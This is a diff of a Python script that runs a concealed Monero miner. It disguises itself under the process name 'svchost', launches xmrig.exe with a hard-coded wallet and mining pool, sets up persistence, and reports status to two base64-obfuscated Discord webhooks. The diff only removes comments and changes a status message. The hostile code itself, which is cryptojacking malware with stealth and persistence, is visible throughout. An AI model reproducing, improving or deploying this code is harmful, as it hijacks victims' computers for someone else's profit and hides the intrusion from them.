@@ -5,8 +5,8 @@ from urllib import request
 W_S = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NTk1NDYzMDcyMTcxNy9mcVRQeFk5LWR0UnR1ZjNXUFFuZWhNa1Y1REp1Tm9ocGpzbjB0WFZITHZJdUt3VU9HMzAzcmNlM3ZxRjJVN1pvYzl2Mw==").decode()
 W_M = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwMzg3NjM2NDYzMjMyNjE0NS9ZbFE2MldOaThzUHZZZWlBZlQ5bklCMjVGUFI0ay1Nb1A3MVFTRU5LdTA2eFVOSUFKV2JpWEtKSi03cGExZm9PZmw0SEI=").decode()
 ID = "svchost"
-WORK_DIR = os.path.dirname(os.path.realpath(__file__)) # This handles the space in your name perfectly!
-MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe") # Updated name!
+WORK_DIR = os.path.dirname(os.path.realpath(__file__))
+MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe")
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
 
@@ -54,9 +54,9 @@ def manage():
             notify(f"Engine Engaged. Power: {pwr}%", "mine")
 
 def main():
-    time.sleep(random.randint(5, 15)) # Shorter sleep so you see the ping faster!
+    time.sleep(random.randint(5, 15))
     engage_persistence()
-    notify("SYSTEM ONLINE (v8.0 - Perfect Path Engagement)", "sys")
+    notify("SYSTEM ONLINE (v8.0 - Unwrapped Hydra Active)", "sys")
     while True:
         manage()
         time.sleep(15)
